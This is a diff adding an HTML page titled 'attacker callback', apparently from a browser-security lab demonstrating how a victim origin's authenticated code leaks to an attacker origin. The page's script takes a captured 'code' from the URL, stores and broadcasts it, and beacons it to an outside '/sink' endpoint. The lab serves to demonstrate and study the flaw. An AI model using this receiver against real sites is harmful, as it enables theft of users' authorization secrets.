@@ -1,0 +1,52 @@
+<!doctype html>
+<html lang="en">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>attacker callback</title>
+<style>
+ :root{color-scheme:dark}
+ body{margin:0;font:16px/1.5 -apple-system,BlinkMacSystemFont,system-ui,sans-serif;
+      background:#0d0f14;color:#e8eaf0;padding:18px}
+ .v{border-radius:14px;padding:24px 18px;text-align:center}
+ .bad{background:#7f1020;box-shadow:inset 0 0 0 2px #ff4d6a}
+ .warn{background:#4a3400;box-shadow:inset 0 0 0 2px #ffc53d}
+ .big{font-size:34px;font-weight:800;margin:0;line-height:1.1}
+ code{font-family:ui-monospace,Menlo,monospace;font-size:13px;word-break:break-all}
+ p{font-size:14px}
+</style>
+<div id="out"></div>
+<script>
+(function () {
+  var q = new URLSearchParams(location.search);
+  var code = q.get('code'), what = q.get('what'), tag = q.get('tag') || '';
+  var out = document.getElementById('out');
+
+  if (code) {
+    out.innerHTML = '<div class="v bad"><p class="big">CODE EXFILTRATED</p>'
+      + '<p>The attacker origin <code>' + location.origin + '</code> received an '
+      + 'authenticated secret minted by the victim origin.</p>'
+      + '<p><code>' + code.replace(/[<>&]/g, '') + '</code></p></div>'
+      + '<p>Tag: <code>' + tag.replace(/[<>&]/g, '') + '</code></p>'
+      + '<p>This is now logged on the attacker side. Reopen the initiator page to see it '
+      + 'carried across browsing contexts.</p>';
+    try {
+      localStorage.setItem('samesite_lab_code', code);
+      new BroadcastChannel('samesite_lab').postMessage({ code: code, tag: tag });
+    } catch (e) {}
+    // Beacon the code back so there is one server-side line proving the attacker
+    // origin received it. Cross-site subresource: carries no cookies, by design.
+    var lab = q.get('lab');
+    if (lab) {
+      try {
+        new Image().src = lab.replace(/\/+$/, '') + '/sink?code='
+          + encodeURIComponent(code) + '&tag=' + encodeURIComponent(tag)
+          + '&n=' + Date.now().toString(36);
+      } catch (e) {}
+    }
+  } else {
+    out.innerHTML = '<div class="v warn"><p class="big">'
+      + (what === 'redirect' ? 'redirect landed here' : 'callback hit, no code')
+      + '</p><p>The preview followed the victim-origin redirect onto the attacker origin.</p></div>';
+  }
+})();
+</script>
